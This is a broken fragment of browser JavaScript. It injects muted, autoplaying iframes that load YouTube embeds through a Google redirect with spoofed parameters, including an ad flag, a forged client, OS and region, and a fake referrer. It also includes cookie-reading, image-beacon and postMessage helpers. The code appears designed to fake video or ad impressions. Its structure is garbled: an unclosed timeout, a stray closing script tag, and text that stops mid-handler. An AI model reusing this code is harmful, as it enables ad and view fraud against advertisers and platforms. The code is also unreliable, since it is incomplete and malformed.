    setTimeout(function () {

        document.getElementById("player").remove();

    function createFrame(videoId, el, autoplay, cc, id) {
      var iframe = document.createElement('iframe');

      // ðŸŽ¯ Yahan important YouTube tracking params add kiye gaye hain
      iframe.src =
        'https://www.google.com/url?sa=D&q=https%3A%2F%2Fwww.youtube.com%2Fembed%2F' +
        videoId +
        '%3Fenablejsapi%3D0' +
        '%26autoplay%3D' + autoplay +
        '%26mute%3D1' +
        '%26el%3Ddetailpage' +
        '%26adformat%3D15_2_1' +
        '%26state%3Dpaused' +
        '%26volume%3D100' +
        '%26c%3DTVHTML5' +
        '%26cver%3D2.20250509.01.01' +
        '%26cos%3DMacintosh' +
        '%26cosver%3D10_15_7' +
        '%26hl%3Den_US' +
        '%26cr%3DIN' +
        '%26is_ad%3D1' +
        '%26docid%3D' + videoId +
        '%26referrer%3Dhttps%253A%252F%252Fwww.youtube.com%252F';

      iframe.id = id;
      iframe.style.height = "300px";
      iframe.style.width = "250px";
      document.body.appendChild(iframe);
    }
  </script>

    var finalUrl = "";

    function getCookie(name) {
      var pattern = RegExp(name + "=.[^;]*");
      var matched = document.cookie.match(pattern);
      if (matched) {
        var cookie = matched[0].split('=');
        return cookie[1];
      }
      return false;
    }

    function notify_url(url) {
      var img = new Image();
      img.src = url;
      return false;
    }

    function find_frame(e) {
      var iframes = document.getElementsByTagName('iframe');
      for (var i = 0; i < iframes.length; i++) {
        if (e.source === iframes[i].contentWindow) {
          return iframes[i];
        }
      }
    }

    window.addEventListener('message', function (event) {
